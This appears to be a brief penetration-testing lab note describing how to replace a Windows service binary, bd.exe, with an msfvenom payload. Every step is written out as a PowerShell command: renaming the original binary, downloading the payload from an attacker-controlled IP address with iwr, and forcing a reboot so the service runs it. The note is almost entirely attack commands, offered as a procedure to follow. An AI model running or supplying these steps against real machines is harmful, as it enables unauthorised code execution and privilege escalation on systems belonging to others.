Goal : Replace bd.exe with msfvenom payload exe

Have to rename current bd.exe away first so I can move my own bd.exe in

```Powershell
PS C:\bd> move bd.exe bdbackup.exe
```

```powershell
PS C:\bd> powershell -c "iwr -uri http://192.168.45.199/bd.exe -OutFile bd.exe"
```

Restart bd.exe so my new bd.exe can execute

```powershell
PS C:\bd> shutdown /r
```

```powershell
PS C:\User> shutdown /r /t 0
```
